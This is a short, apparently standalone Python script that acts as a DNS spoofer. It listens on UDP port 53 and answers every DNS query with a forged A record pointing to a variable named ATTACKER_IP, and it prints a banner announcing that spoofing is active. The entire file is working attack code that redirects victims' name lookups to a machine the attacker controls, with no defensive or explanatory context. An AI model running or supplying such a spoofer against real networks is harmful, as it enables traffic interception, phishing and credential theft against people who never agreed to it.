import socket

ATTACKER_IP = "127.0.0.1"  # Point all DNS lookups to attacker's machine

def handle_dns_request(data):
    transaction_id = data[:2]
    flags = b"\x81\x80"
    qdcount = b"\x00\x01"
    ancount = b"\x00\x01"
    nscount = b"\x00\x00"
    arcount = b"\x00\x00"
    dns_header = transaction_id + flags + qdcount + ancount + nscount + arcount

    query = data[12:]
    response_name = b"\xc0\x0c"
    response_type = b"\x00\x01"
    response_class = b"\x00\x01"
    ttl = b"\x00\x00\x00\x3c"
    rdlength = b"\x00\x04"
    rdata = socket.inet_aton(ATTACKER_IP)

    dns_answer = response_name + response_type + response_class + ttl + rdlength + rdata
    return dns_header + query + dns_answer

def start_dns_spoofer():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', 53))  # ⚠️ Requires sudo/root
    print(f"[🧠 DNS Spoofing Active] Responding to all DNS queries with {ATTACKER_IP}")

    while True:
        data, addr = sock.recvfrom(512)
        response = handle_dns_request(data)
        sock.sendto(response, addr)

if __name__ == "__main__":
    start_dns_spoofer()

